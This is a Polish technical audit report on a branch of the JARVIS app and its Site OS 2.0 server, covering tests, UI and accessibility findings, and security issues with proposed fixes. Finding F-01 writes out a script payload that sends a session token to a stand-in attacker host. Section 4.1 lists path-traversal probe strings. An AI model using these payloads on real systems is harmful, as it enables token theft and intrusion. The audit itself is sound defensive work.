# JARVIS — MASTER ACCEPTANCE AUDIT
## Odbiór techniczny gałęzi `feat/master-interface-polish` przed scaleniem z `fix/production-integration`

- **Data audytu:** `2026-11-25` (środowisko wykonawcze: Ubuntu 24.04 LTS VM, Node.js `v22.23.5`, Chromium + `Xvfb :99`)
- **Tryb pracy:** `100% READ-ONLY` na repozytorium `/home/antigravity/Talent620/Jarvis` (zero modyfikacji śledzonych plików, zero merge/push/PR)
- **Audytowana gałąź (HEAD):** `feat/master-interface-polish` (`b020365240e8de3e2c1b6fd5c9e2aa31fd739992`)
- **Gałąź bazowa (cel scalenia):** `fix/production-integration` (`4ec159489bad5be24a2116c9d7e4df5cd179b78a`)
- **Gałąź produkcyjna (`main`):** `da4ee1432ccadda6c3c599292fb22f803383bb13`

---

## 1. Podsumowanie wykonawcze (Executive Summary)

Gałąź `feat/master-interface-polish` (`b020365`) stanowi liniowego potomka (`fast-forward`, `0` konfliktów) gałęzi `fix/production-integration` (`4ec1594`), obejmującego **5 commitów**, **59 zmienionych plików** (`+1 671 / -378` linii) oraz **0 nowych zależności npm**. Niezależne uruchomienie pełnego zestawu walidacyjnego w trakcie niniejszego audytu potwierdziło:
- `node scripts/secret-scan.mjs --all` → **PASS** (`0.35s`, kod `0`),
- `npm run lint` (`eslint .`) → **PASS** (`21.86s`, kod `0`, `0` ostrzeżeń),
- `npx tsc -b` → **PASS** (`25.09s`, kod `0`),
- `npx vite build` → **PASS** (`14.10s`, przyrost rozmiaru paczki JS jedynie `+12.64 KB` / `+0.46%` oraz CSS `+5.37 KB` raw / `+1.13 KB` gzip względem `4ec1594`),
- `npx vitest run` → **PASS** (`370/370` plików testowych, `3 114/3 114` testów, `0` pominiętych, `0` błędów),
- `npm run test:e2e:xvfb` → **PASS** (`10/10` przepływów na żywym `Xvfb :99` + Chromium, `0` błędów CORS i `0` wyjątków JS),
- `npm run memory:verify` → **PASS** (`9/9` zdarzeń poprawnych, sumy kontrolne `CURRENT_STATE.*` nienaruszone).

Nie stwierdzono **żadnego błędu klasy `P0` (krytycznego blokera)**. Zidentyfikowano natomiast **1 realną lukę bezpieczeństwa klasy `P1` (odziedziczoną z wcześniejszego projektu `Site OS`, lecz nadal obecną w `Site OS 2.0`)** oraz **7 zagadnień klasy `P2`** i **2 drobne uwagi higieniczne `P3`**, potwierdzonych empirycznie skryptami penetracyjnymi HTTP i inspekcją pikseli w przeglądarce Chromium przez CDP.

**Werdykt odbiorczy:** **`APPROVED WITH CONDITIONS`** — gałąź jest stabilna i gotowa do scalenia z `fix/production-integration` pod warunkiem załatania przed promocją na `main` jednowierszowej luki `P1` (`Content-Security-Policy: sandbox ...` na lokalnym endpoincie `GET /p/:projectId` w `site-os/server.mjs:578`) oraz wskazanych poniżej drobnych poprawek `P2/P3`.

---

## 2. Identyfikacja i kontrola Git

Wszystkie poniższe fakty zostały zweryfikowane bezpośrednio poleceniami `git` i `git ls-remote --heads origin`:

| Parametr | Zweryfikowana wartość | Dowód |
|---|---|---|
| Aktualna gałąź | `feat/master-interface-polish` | `git status --short --branch` |
| Aktualny `HEAD` | `b020365240e8de3e2c1b6fd5c9e2aa31fd739992` | `git rev-parse HEAD` |
| Stan `working tree` przed i po audycie | **100% czyste** (`brak plików zmodyfikowanych i nieśledzonych`) | `git status --porcelain=v1 -uall` → puste |
| Zdalny `origin/feat/master-interface-polish` | `b020365240e8de3e2c1b6fd5c9e2aa31fd739992` (**zgodny 1:1 z lokalnym**) | `git ls-remote --heads origin` |
| Lokalny i zdalny `fix/production-integration` | `4ec159489bad5be24a2116c9d7e4df5cd179b78a` (**zgodny 1:1**) | `git ls-remote --heads origin` |
| Lokalny i zdalny `main` | `da4ee1432ccadda6c3c599292fb22f803383bb13` (**zgodny 1:1**) | `git rev-parse main origin/main` |
| `git merge-base` (`fix/production-integration`, `feat/master-interface-polish`) | `4ec159489bad5be24a2116c9d7e4df5cd179b78a` | Gałąź bazowa jest bezpośrednim przodkiem (`fast-forward`, `0` konfliktów) |
| Zakres diff (`4ec1594...b020365`) | `59 files changed, 1671 insertions(+), 378 deletions(-)` | `56` zmodyfikowanych (`M`), `3` dodane (`A`), `0` usuniętych (`D`) |
| Zmiany zależności (`package.json`, `site-os/package.json`) | **Brak nowych pakietów** (`package.json` nietknięty; w `site-os/package.json` podbito `version: "2.0.0"` i opis) | `git diff 4ec1594...b020365 -- '*package*.json'` |
| `git diff --check 4ec1594...b020365` | Kod wyjścia **`2`**: `site-os/public/styles.css:748: new blank line at EOF.` | Sklasyfikowane jako `[F-09 | P3]` |

*(Uwaga operacyjna Git: lokalny `.git/config` w klonie VM ma zawężony refspec `+refs/heads/main:refs/remotes/origin/main`, dlatego `git branch -r` pokazuje wyłącznie `origin/main`, podczas gdy `git ls-remote --heads origin` potwierdza obecność i pełną zgodność SHA wszystkich gałęzi na GitHubie).*

### Historia commitów w zakresie audytu (`4ec1594..b020365`)
1. `53edbf4` — `feat(ui): unify all 34 module headers, desktop widths, Editorial theme & Centrum filters`
2. `88c4c81` — `feat(site-os): Site OS 2.0 Boutique Studio, tunnel isolation, Magic-Bytes, 60KB asset guard & SSE`
3. `e2b13ce` — `fix(ui): second-pass pixel polish — fix squeezed flex button rows & Boutique CTA contrast`
4. `6c9e13a` — `test(e2e): wait for React mount & Boot screen teardown cleanly in e2e-xvfb-probe`
5. `b020365` — `docs(memory): record master-interface-polish event, ADR-0008 & verified CURRENT_STATE (370/370 suites, 3114/3114 tests)`

### Integralność `project-memory`
- `npm run memory:verify` → **PASS** (`Pliki generowane project-memory są nienaruszone`, `zdarzenia: 9/9 poprawnych`).
- Drobna rozbieżność metadanych (`[F-10 | P3]`): `project-memory/CURRENT_STATE.md:8` wskazuje `Commit 6c9e13a ... zmiany w drzewie (poza project-memory): TAK`, ponieważ migawka została wygenerowana tuż przed zatwierdzeniem commita dokumentacyjnego `b020365` (co jest naturalnym efektem zapisywania stanu wewnątrz commita zamykającego).

---

## 3. Audyt UI, UX, dostępności (A11y) i kompatybilności przeglądarkowej

### 3.1. Przegląd zmodyfikowanych modułów interfejsu (34 arkusze/modale + ekran główny + motywy)
- **Zunifikowane nagłówki i przyciski zamykania (`.panel-close`):** Wszystkie 34 okna dialogowe (`.sheet > .panel` oraz kanoniczny `src/components/Modal.tsx`) posiadają spójny przycisk `×` (`.panel-close`, rozmiar zmierzony w DOM: `34×34 px` przy 100%, `43×43 px` przy 125%, `51×51 px` przy 150%) oraz dolny przycisk `Zamknij`.
- **Szerokości desktopowe (`src/styles/index.css`):** Poprawnie rozróżniono okna standardowe (`580px`), szerokie narzędzia robocze `.panel-wide` (`min(920px, 95vw)` dla `WebStudio`, `More`, `Settings`, `Studio`, `MarketingWorkspace`, `Gadgets`, `AdminPanel`) oraz pełne pulpity analityczne `.panel-xl` (`min(1140px, 96vw)` dla `SalesCrm`, `SalesDashboard`, `FinancialDashboard`, `TaskHub`).
- **Centrum (`src/components/More.tsx`):** Wyszukiwarka pełnotekstowa po nazwie/opisie/słowach kluczowych + poziomy pasek kategorii (`Wszystko`, `Sprzedaż i biznes`, `Marketing`, `Praca i organizacja`, `Zakupy i okazje`, `Narzędzia`) + 6 kart głównych celów działają płynnie i bez przepełnienia poziomego (`docOverflowX = 0` na `360px`, `390px`, `844px` i `1440px`).
- **Motyw `Editorial` (`body.theme-editorial` w `src/styles/index.css:347+` + `index.html` fonty `Instrument Serif` / `Plus Jakarta Sans`):** Zweryfikowany wizualnie na żywym `Settings` i `WebStudio` (`/tmp/audit-screens/audit3_webstudio_editorial.png`) — ciepłe tło alabastrowe `rgb(245, 241, 232)`, panele `rgb(255, 253, 249)`, tekst atramentowy `rgb(16, 35, 50)`, wysoka czytelność i prawidłowy kontrast przycisków CTA.
- **Kompatybilność Chrome 79 / Samsung S9 (ES2019):**
  - Skaner AST/literałów `tests/s9RegexGuard.test.ts` przeszedł w `1.92s` (`0` literałów `/u`, `\p{...}` oraz `lookbehind` w całym katalogu `src/`).

### 3.2. Wykryte braki dostępności i detale wizualne (potwierdzone w żywym DOM i na zrzutach PNG)
1. **`[F-02 | P2 — A11Y]` Brak pułapki fokusu (`Focus Trap`) w 29 starszych komponentach `.sheet` oraz brak `aria-label`/`aria-labelledby` w 18 z nich:**
   - Kanoniczny `src/components/Modal.tsx` posiada pełny `nextTrapIndex` i przywracanie fokusu. Natomiast 29 komponentów renderujących własne `<div className="sheet" role="dialog" aria-modal="true">` obsługuje klawisz `Escape` (`moreClosedOnEscape: true`; wyjątek celowy: `PermissionDialog.tsx` wymuszający jawną decyzję), **ale nie przechwytuje klawisza `Tab`**.
   - **Dowód empiryczny CDP (`task-3629`):** Wysłanie sekwencji `Input.dispatchKeyEvent(Tab)` wewnątrz otwartego `More.tsx` przeniosło `document.activeElement` poza `.sheet` do przycisków paska górnego pod spodem (`legacySheetTabEscapedToBackground: true`). Dodatkowo 18 z tych 29 okien (`AdStudio`, `AdminPanel`, `BargainHunter`, `BrandKit`, `FinancialDashboard`, `GoalStatusPanel`, `GrowthDayPanel`, `Help`, `Journal`, `LeadCandidatesPanel`, `LeadDetail`, `MailCompose`, `MarketingWorkspace`, `Panels`, `PermissionDialog`, `Projects`, `SalesCrm`, `Studio`, `Transcribe`, `Translator`, `WhereToBuy`) nie deklaruje `aria-label` ani `aria-labelledby` na elemencie `role="dialog"`.
2. **`[F-08 | P2 — UI]` Kolizja warstwy `.toast` z nagłówkiem arkuszy `.sheet` na małych ekranach oraz kontrast pola `<input>` na ekranie Onboarding w `theme-light`:**
   - Na zrzutach `/tmp/audit-screens/audit_more_844x390_landscape.png`, `/tmp/audit-screens/audit3_webstudio_360.png` i `/tmp/audit-screens/audit3_sales_360.png` stały dymek ostrzegawczy `⚠ Słowo-klucz „Jarvis” [Sprawdź]` posiada wyższy `z-index` niż `.sheet`, przez co na `360×800` zasłania tytuł otwartego modułu, a w orientacji poziomej `844×390` przykrywa przycisk zamykania `×` (`.panel-close`).
   - Na zrzucie `/tmp/audit-screens/audit2_settings_theme-light.png` pole `<input placeholder="Wklej klucz API...">` wewnątrz `.onboard` w motywie `body.theme-light` zachowuje ciemne tło z ciemnoszarym tekstem zastępczym (kontrast `~1.6:1`), podczas gdy w `body.theme-editorial` pole ma jasne tło i pełną czytelność.
   - Drobne detale `360×800`: w `WebStudio` karta kroku nr 4 zawija pojedynczą literę `"4. Dostarczeni\ne"`; przy domyślnym `navigator.language = "en-US"` ekran pustej rozmowy wyświetla angielski blok powitalny obok polskich etykiet paska dolnego (`audit_main_360x800.png`).

---

## 4. Audyt funkcjonalny i bezpieczeństwa `Site OS 2.0`

Przeprowadzono pełną analizę kodu (`site-os/server.mjs`, `site-os/public/{index.html,styles.css,app.js}`, `src/lib/siteOs.ts`, `src/lib/webgen.ts`, `src/components/WebStudio.tsx`, `src/App.tsx`) oraz żywe testy penetracyjne i trwałości przeciwko uruchomionemu serwerowi `node site-os/server.mjs`.

### 4.1. Co działa wzorcowo (potwierdzone empirycznie)
- **Twarda izolacja tunelu publicznego (`site-os/server.mjs:514-522`):** Przetestowano żądania z nagłówkami `CF-Connecting-IP`, `X-Forwarded-For` i `Forwarded`:
  - `/`, `/index.html`, `/app.js`, `/api/health`, `/api/session`, `/api/projects` (nawet z poprawnym `Bearer` tokenem!), `/api/events?token=...` → **wszystkie zwróciły `403 Forbidden`**.
  - Próby path traversal (`/..%2fpackage.json`, `/%2e%2e/%2e%2e/etc/passwd`, `/p/..%2fprojects.json`, `/api/uploads/public/..%2fprojects.json`, `/api/uploads/public/..`, `/api/uploads/public/../../runtime.json`) → **wszystkie zablokowane (`404` / `403` / `401`)**.
  - Publiczne ścieżki klienta: `GET /p/:projectId` (`200`), `GET /api/uploads/public/:file` (`200` + `X-Content-Type-Options: nosniff`), `POST /api/leads/:projectId` (`201`) → **działają prawidłowo**.
- **Weryfikacja binarnych Magic Bytes i limity uploadu (`site-os/server.mjs:180-203, 635-654`):**
  - Prawdziwy obraz PNG → `201 Created` (`image/png`, `nosniff`).
  - Kod `<svg onload="alert(1)">` zamaskowany jako `data:image/png;base64,...` → **`415 Unsupported Media Type`**.
  - Fałszywy kontener RIFF (`RIFF....AVI ` zamiast `WEBP`) zamaskowany jako `image/webp` → **`415 Unsupported Media Type`**.
  - Plik `> 5 MB` na `/api/uploads` oraz projekt HTML `> 8 MB` na `PUT /api/projects/:id` → **`413 Payload Too Large`**.
- **Izolacja `Podglądu JS` wewnątrz edytora (`site-os/public/app.js:300-326`):** Po przełączeniu przycisku `#selectModeBtn` z `Edycja` na `Podgląd JS` atrybut `sandbox` ramki `#siteFrame` zmienia się z `"allow-same-origin allow-forms"` na `"allow-scripts allow-forms"` (potwierdzone w Chromium: `sameOriginBlockedProperly: true`). Skrypty strony (kompas, kalkulator ROI, motywy) działają w oparciu o `origin === "null"`, bez dostępu do DOM edytora i `localStorage`.
- **Upsert po `jarvisProjectId`, limit 20 wersji i trwałość po restarcie (`SIGTERM` → ponowny start):**
  - Dwukrotny `POST /api/public/projects` z tym samym `jarvisProjectId` zwrócił `201`, a następnie `200` (`upserted: true`, brak duplikatu).
  - Po 26 kolejnych zapisach projektu tablica `versions` utrzymała dokładny limit **`20`** migawek (`newestSavedVersionLabel: "V25"`, aktualny HTML `V26`).
  - Po restarcie procesu `server.mjs`: token właściciela (`runtime.token`), projekty, historia 20 wersji oraz leady przetrwały nienaruszone, natomiast `pairingCode` uległ rotacji.
- **Strumień SSE (`/api/events`):** Bez tokenu zwraca `401`, przez tunel `403`, lokalnie z tokenem natychmiast dostarcza `event: connected` oraz `event: command-queued` po wysłaniu polecenia AI.

### 4.2. Potwierdzone luki i ryzyka w `Site OS 2.0`
1. **`[F-01 | P1 — HIGH SECURITY]` Lokalny podgląd pełnoekranowy `GET /p/:projectId` dzieli `origin` (`127.0.0.1:3210`) z `GET /api/session` i ujawnia `runtime.token`:**
   - **Lokalizacja:** `site-os/server.mjs:536-539`, `site-os/server.mjs:572-583`, `site-os/public/app.js:1109` (`Otwórz stronę`).
   - **Mechanizm i dowód:** Endpoint `GET /p/:projectId` wysyła nagłówek `"Content-Security-Policy": "frame-ancestors *"` **bez dyrektywy `sandbox`**. Gdy właściciel kliknie przycisk `Otwórz stronę` (`http://127.0.0.1:3210/p/<id>`), przeglądarka otwiera dokument HTML na tym samym originie `http://127.0.0.1:3210` z połączeniem z loopbacka (`127.0.0.1`). W tym samym czasie `GET /api/session` dla każdego żądania z loopbacka zwraca bez autoryzacji `200 OK` z pełnym `{ token: runtime.token, pairingCode }`. Jeśli użytkownik zaimportuje niezaufany plik HTML (`Importuj HTML`) lub pośredni prompt-injection wstrzyknie `<script>fetch('/api/session').then(r=>r.json()).then(d=>fetch('https://attacker.tld/?t='+d.token))</script>`, otwarcie lokalnego podglądu `/p/:id` kompromituje `runtime.token` (pełny odczyt leadów, nadpisywanie/usuwanie wszystkich projektów i sterowanie tunelem).
   - **Minimalna naprawa (1 linia):** Zmienić nagłówek CSP w `site-os/server.mjs:578` na:
     `"Content-Security-Policy": "sandbox allow-scripts allow-forms allow-popups; frame-ancestors *"`
     *(Dokument otrzyma nieprzezroczysty `origin: null`; `corsHeaders()` w linii `238` już akceptuje `origin === "null"`, więc formularze leadowe `POST /api/leads/:id` będą nadal działać bez zakłóceń, natomiast `fetch('/api/session')` zostanie zablokowany przez SOP/CORS, bo `/api/session` nie dopuszcza obcego odczytu albo wystarczy dodatkowo odrzucić `req.headers.origin === "null"` w `/api/session`!).*
2. **`[F-03 | P2 — SECURITY / FUNCTIONAL]` Okno wyścigu w `/api/pair` dla wolnych połączeń równoległych oraz blokada parowania LAN (`0.0.0.0`):**
   - **Lokalizacja:** `site-os/server.mjs:514-522` oraz `site-os/server.mjs:541-550`.
   - W `POST /api/pair` wywołanie `allowPairAttempt(req)` następuje *przed* `await bodyJson(req)`, a `recordPairFailure(req)` *po* odczytaniu body. Przy zwykłym burście HTTP (12 żądań `Promise.all`) serwer zwrócił poprawnie `5×401` i `7×429` oraz zrotował 6-cyfrowy kod parowania, jednak otwarcie kilkudziesięciu gniazd TCP wysyłających nagłówki przed dosłaniem ostatniego bajtu JSON pozwoliłoby przejść `allowPairAttempt` przed zapisaniem 5. błędu.
   - Ponadto globalna blokada `if (!isLoopback(req))` w linii `514` odcina `/api/pair`, `/api/public/projects` i `/api/public/commands` dla każdego adresu innego niż `127.0.0.1`/`::1`. Oznacza to, że nawet po świadomym uruchomieniu `SITE_OS_HOST=0.0.0.0` sparowanie aplikacji JARVIS z telefonu Android w domowej sieci Wi-Fi zwraca `403` (należy rozdzielić detekcję nagłówków proxy `isProxiedTunnel(req)` od bezpośrednich połączeń RFC1918 LAN).
3. **`[F-04 | P2 — FUNCTIONAL]` Regex `extractDataUriAssets` pochłania sąsiedni atrybut przy nieujętym w cudzysłów `src=data:image/...`:**
   - **Lokalizacja:** `src/lib/siteOs.ts:42` (`/data:image\/[a-zA-Z0-9.+-]+;base64,[A-Za-z0-9+/=\s]{256,}/g`).
   - **Dowód empiryczny:** Dla standardowego `<img src="data:image/png;base64,..." alt="hero">` działa bezbłędnie (`quotedPreservesAlt: true`), lecz dla HTML bez cudzysłowów `<img src=data:image/png;base64,... alt="hero">` klasa `\s` dopasowuje spację, a `[A-Za-z0-9+/=]` zjada `alt=` dając uszkodzony znacznik `<img src=TOKEN"hero">`. Usunięcie `\s` całkowicie eliminuje problem.
4. **`[F-05 | P2 — RESOURCE / SECURITY]` Brak limitu `MAX_SSE_CLIENTS` na `/api/events` i przekazywanie tokenu w query stringu:**
   - **Lokalizacja:** `site-os/server.mjs:31, 267, 615-632`. Potwierdzono otwarcie 25+ jednoczesnych strumieni SSE (`extra25ConnectionsAccepted: 25`), z których każdy tworzy własny timer `setInterval(..., 20000)`. Zalecany limit np. `MAX_SSE_CLIENTS = 16` z odrzucaniem najstarszego lub kodem `429`, oraz wymiana tokenu na krótkotrwały jednorazowy ticket lub nagłówek/cookie `HttpOnly; SameSite=Strict`.
5. **`[F-06 | P2 — UX / DATA FLOW]` Ciche nadpisanie niezapisanej/równoległej edycji podczas wolnej komendy AI oraz wysyłka pełnego HTML zamiast pojedynczej sekcji:**
   - **Lokalizacja:** `site-os/server.mjs:703-710`, `site-os/public/app.js:1194`, `src/lib/siteOs.ts:191`.
   - Gdy użytkownik edytuje stronę w czasie, gdy JARVIS generuje odpowiedź AI (15–30 s), `PUT /api/public/commands/:id` zapisuje stan sprzed nadpisania w `versions[0]` (brak trwałej utraty danych!), ale `app.js` po odebraniu `project-updated` natychmiast przeładowuje projekt bez pytania o konflikt. Ponadto `siteOs.ts:191` mimo opisu „chirurgicznej edycji sekcji” w `index.html:189` wysyła do LLM cały odchudzony dokument `strippedHtml` z kontekstem zaznaczenia (limit `SAFE_EDIT_CHARS = 60 000` nadal chroni przed zawieszeniem, ale bardzo duże dokumenty `>60 KB` czystego kodu HTML nadal zostaną odrzucone).
6. **`[F-07 | P2 — SUPPLY-CHAIN]` Pobieranie binarki `cloudflared` na Linuxie sprawdza wyłącznie rozmiar (`>= 5 MB`) bez weryfikacji sumy SHA-256:**
   - **Lokalizacja:** `site-os/server.mjs:391-401`.
7. **`[F-08c | P2 — RESPONSIVE]` Interfejs samego edytora `Site OS 2.0` nie posiada mobilnego układu `< 768px`:**
   - Na telefonie `390×844` (`/tmp/audit-screens/audit_siteos_mobile_390.png`) 3-kolumnowa siatka warsztatu ma `docOverflowX = 330px`. *(Same strony generowane dla klientów na `/p/:id` oraz kanwa `Telefon 360px` są w pełni responsywne).*

---

## 5. Audyt powierzchni bezpieczeństwa Electron IPC, narzędzi systemowych i MCP

### 5.1. Wpływ gałęzi `feat/master-interface-polish`
- Gałąź `feat/master-interface-polish` **nie zmodyfikowała żadnego pliku w `electron/`** (`0` zmian w `electron/main.cjs`, `preload.cjs`, `local-siteos.cjs`, `workspace-tools.cjs`, `mcp-stdio.cjs`, `public-page.cjs`, `page-extract.cjs`, `launch-app.cjs`).
- Uruchamianie `Site OS` z poziomu Electrona odbywa się przez `shell.openExternal("http://127.0.0.1:3210")`, dzięki czemu `Site OS` działa w zewnętrznej przeglądarce systemowej i **nigdy nie ma dostępu do mostu `window.jarvisDesktop`**. Główne okno Electrona utrzymuje `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` oraz blokadę `will-navigate` wyłącznie do `file://`.
- Skrypt weryfikacji izolacji przestrzeni roboczej `npm run tools:verify` (`scripts/verify-workspace-tools.cjs`) przeszedł w `100%` (`files.write/read/list`, `git`, `terminal`, `http`, `browser`, wyłączone narzędzia generowane bez sandboxa, `docker`, `sqlite`).

### 5.2. Istniejące wcześniej (pre-existing) ryzyka w warstwie Electron (poza zakresem diffu tej gałęzi, odnotowane dla pełnej przejrzystości architektonicznej)
- **`[E-01 | P2 pre-existing]`** `electron/main.cjs:458, 459, 856`: handlery `jarvis:google-status`, `jarvis:google-disconnect` oraz `jarvis:clipwatch` nie wywołują strażnika `if (!isTrustedIpc(event))`.
- **`[E-02 | P2 pre-existing]`** `electron/main.cjs:324-326, 455`: plik `google-tokens.json` zapisuje `clientSecret` i `refresh_token` otwartym tekstem JSON zamiast przez `safeStorage` (używany już poprawnie dla sejfu sekretów).
- **`[E-03 | P2 pre-existing]`** `electron/workspace-tools.cjs:8, 131-135, 181` oraz `electron/mcp-stdio.cjs:5`: `SAFE_COMMANDS` dopuszcza `node`, `npx`, `docker` bez systemowego sandboxa procesów (`inside()` chroni ścieżki `files_*` i `cwd`, lecz po ręcznym zatwierdzeniu zgody przez użytkownika kod uruchomiony przez `node -e` nie jest ograniczony przez jądro OS wyłącznie do katalogu `JARVIS Workspace`). Moduły `public-page.cjs` + `page-extract.cjs` posiadają natomiast poprawną ochronę anty-SSRF (pinning DNS + blokada prywatnych IPv4/IPv6) i wycinanie `<script>/<style>/hidden`.

---

## 6. Niezależne wykonanie testów automatycznych, analizy statycznej i buildu (wraz z porównaniem bazowym)

Wszystkie poniższe polecenia zostały uruchomione na świeżo podczas niniejszego audytu bez modyfikacji repozytorium:

| Kategoria | Polecenie | Wynik | Czas | Szczegóły / metryki |
|---|---|---|---|---|
| Skan sekretów | `node scripts/secret-scan.mjs --all` | **PASS (`0`)** | `0.35s` | Czysto w całym repozytorium |
| Linter statyczny | `npm run lint` (`eslint .`) | **PASS (`0`)** | `21.86s` | `0` błędów, `0` ostrzeżeń |
| Kompilator TS | `npx tsc -b` | **PASS (`0`)** | `25.09s` | Pełna zgodność typów ścisłych |
| Integralność pamięci | `npm run memory:verify` | **PASS (`0`)** | `0.4s` | `CURRENT_STATE.*` sha256 OK, `9/9` zdarzeń poprawnych |
| Testy jednostkowe i integracyjne | `npx vitest run` | **PASS (`0`)** | `279.77s` (`36.49s` testy) | **`370/370` plików**, **`3 114/3 114` testów** (`0` failed, `0` skipped; wzrost z `369` plików / `3 108` testów na `4ec1594`) |
| Kontrakt ES2019 (S9 / Chrome 79) | `tests/s9RegexGuard.test.ts` | **PASS (`0`)** | `1.92s` | `0` niedozwolonych regexów w `src/` |
| Smoke test `Site OS 2.0` | `npm --prefix site-os run smoke` (na izolowanej instancji `/tmp`) | **PASS (`0`)** | `0.8s` | Sesja, projekty, podgląd i komendy OK |
| Testy penetracyjne `Site OS 2.0` | `node /tmp/audit-security-probe.mjs` | **PASS (`0`)** | `6.4s` | Tunel `403`, Magic Bytes `415`, limity `413`, 20 wersji, SSE, restart OK; potwierdzono `F-01`, `F-04`, `F-05` |
| Izolacja narzędzi Workspace | `npm run tools:verify` | **PASS (`0`)** | `2.1s` | `10/10` aktywnych adapterów OK (`postgres: null` — brak `psql`) |
| Żywe testy E2E na pulpicie X11 | `npm run test:e2e:xvfb` | **PASS (`0`)** | `11.8s` | **`10/10` PASS**, `0` błędów CORS, `0` wyjątków JS |
| Produkcyjny bundle Vite | `npx vite build --outDir /tmp/...` | **PASS (`0`)** | `14.10s` | `2 442` modułów przetransformowanych |

### Porównanie rozmiaru paczki produkcyjnej: baza `4ec1594` vs audytowany `HEAD b020365`
*(Zbudowano czysty `git worktree --detach` dla `4ec1594` w `/tmp/jarvis-audit-base`, zmierzono artefakty i natychmiast usunięto worktree):*

| Artefakt | `fix/production-integration` (`4ec1594`) | `feat/master-interface-polish` (`b020365`) | Delta |
|---|---|---|---|
| Suma wszystkich chunków JS (`assets/*.js`) | `2 753.06 KB` | `2 765.70 KB` | **`+12.64 KB` (`+0.46%`)** |
| Główny chunk `index-*.js` | `1 024.97 KB` (`376.37 KB` gzip) | `1 028.89 KB` (`377.79 KB` gzip) | **`+3.92 KB` (`+1.42 KB` gzip)** |
| Suma stylów CSS (`assets/*.css`) | `87.26 KB` | `92.63 KB` | **`+5.37 KB`** |
| Główny arkusz `index-*.css` | `76.90 KB` (`16.34 KB` gzip) | `82.41 KB` (`17.47 KB` gzip) | **`+5.51 KB` (`+1.13 KB` gzip)** |
| Chunk `WebStudio-*.js` | `35.65 KB` | `36.02 KB` | `+0.37 KB` |
| Chunk `More-*.js` (`Centrum`) | `8.89 KB` | `9.69 KB` | `+0.80 KB` |

*(Istniejące wcześniej ostrzeżenia budowania Vite: chunk `index-*.js > 500 KB` oraz mieszane importy statyczne/dynamiczne dla `store.ts`, `voice.ts`, `autocore/*` występują identycznie na `4ec1594` i `b020365`).*

---

## 7. Weryfikacja na żywym środowisku i wielowymiarowy audyt wizualny (`Xvfb :99` + Chromium CDP)

Wykonano i ręcznie przejrzano **25 zrzutów ekranu PNG** zapisanych w `/tmp/audit-screens/` dla rozdzielczości **`360×800`**, **`390×844`**, **`844×390` (landscape)**, **`1440×900`**, powiększeń **`125%` i `150%`**, testu przeciążeniowego długim niełamliwym adresem URL (`165` znaków bez spacji + `35` zdań) oraz motywów `Obsidian`, `Light`, `Editorial`, `Aurora` i `Matrix`:
- **Brak poziomego przepełnienia w aplikacji JARVIS (`docOverflowX = 0`, `bodyOverflowX = 0`, `bubblesOverflow = []`)** we wszystkich badanych rozdzielczościach (`360px`, `390px`, `844px`, `1440px`) i przy powiększeniach `125%`/`150%`, w tym dla długiego niełamliwego linku URL w dymku rozmowy (`audit3_conv_long_360.png`).
- **Żywy `Site OS 2.0` (`1440×900` oraz kanwa `Telefon 360px`):** Edytor ładuje wzorcowy projekt `Pracownia ImPULS`, obsługuje przełączanie kanwy (`Desktop`, `Tablet`, `Telefon 360px`, `Poziom`), izolowany tryb `Podgląd JS`, zakładkę `Publikuj` z licznikiem `Historia wersji (do 20)` i statusem `SSE aktywne` (`audit_siteos_1440_edit.png`, `audit_siteos_phone_canvas.png`). Na telefonie `390×844` sam edytor `Site OS` wykazuje poziomy scroll (`docOverflowX = 330px`, opisane w `F-08c`).

---

## 8. Ograniczenia środowiska audytowego (czego NIE wykonano w VM i czego nie udajemy)

Zgodnie z zasadą uczciwości inżynierskiej poniższe testy **NIE mogły zostać wykonane** w kontenerze/VM bez fizycznego sprzętu i kluczy zewnętrznych:
1. **Natywna binarka Electron (`electron .` / AppImage / `.deb`):** Binarka Electrona nie jest zainstalowana w VM (CDN Electrona zwracał `503`, brak fizycznej sesji Wayland/GNOME keyring dla `safeStorage`, `desktopCapturer` i globalnego skrótu `Ctrl+Alt+X`). Moduły `electron/*.cjs` zweryfikowano statycznie oraz testami integracyjnymi Node (`npm run tools:verify`, `tests/localSiteOsStart.test.ts`, `tests/mcpStdio.test.ts`, `tests/publicPage.test.ts`).
2. **Fizyczne urządzenia audio/wideo i lokalne GPU (`Ollama` / `Whisper` / mikrofon / kamera):** Przetestowano logikę routingu i fallbacków bez fizycznego strumienia mikrofonu ani lokalnego serwera GPU Ollama.
3. **Żywy tunel publiczny `cloudflared` i zewnętrzne płatne API (`Anthropic` / `OpenAI` / `Gemini`):** Izolację tunelu zweryfikowano lokalnie pełną macierzą nagłówków proxy Cloudflare (`CF-Connecting-IP`, `X-Forwarded-For`, `Forwarded`), bez otwierania publicznego tunelu internetowego i bez użycia kluczy API właściciela.
4. **Fizyczny telefon Android (`APK`):** Gałąź nie zmienia kodu natywnego `android/`; responsywność `360×800` i `390×844` oraz kontrakt ES2019 zweryfikowano w Chromium.

---

## 9. Pełna macierz znalezisk (`P0 – P3`)

| ID | Priorytet | Obszar / Plik | Opis problemu i konsekwencja | Rekomendowana minimalna naprawa |
|---|---|---|---|---|
| **F-01** | **P1** | `site-os/server.mjs:536-539, 578` | `GET /p/:projectId` otwierany lokalnie (`Otwórz stronę` na `127.0.0.1:3210`) nie ustawia `CSP: sandbox`, przez co niezaufany JS w zaimportowanym/wygenerowanym projekcie dzieli `origin` z `GET /api/session` i może odczytać `runtime.token`. *(Odziedziczone sprzed 2.0).* | Dodać `sandbox allow-scripts allow-forms allow-popups;` do nagłówka `Content-Security-Policy` w `GET /p/:projectId` oraz odrzucać `Origin: null` na `/api/session`. |
| **F-02** | **P2** | `src/components/*.tsx` (29 plików `.sheet`) | 29 starszych okien `.sheet` ma `role="dialog" aria-modal="true"`, lecz nie blokuje ucieczki klawisza `Tab` do tła (`Modal.tsx` ma pełny focus-trap); 18 okien nie ma `aria-label`/`aria-labelledby`. | Wydzielić hook `useFocusTrap(ref)` z `Modal.tsx` do wspólnego użycia w `.sheet` i uzupełnić `aria-label`. |
| **F-03** | **P2** | `site-os/server.mjs:514, 541-550` | `allowPairAttempt` działa przed `await bodyJson` (okno wyścigu przy wolnych gniazdach TCP); ponadto `!isLoopback(req)` blokuje `/api/pair` w sieci LAN Wi-Fi nawet przy `SITE_OS_HOST=0.0.0.0`. | Inkrementować licznik prób przed `await bodyJson` (lub użyć mutexu per IP) i oddzielić `isProxiedTunnel(req)` od prywatnego LAN RFC1918. |
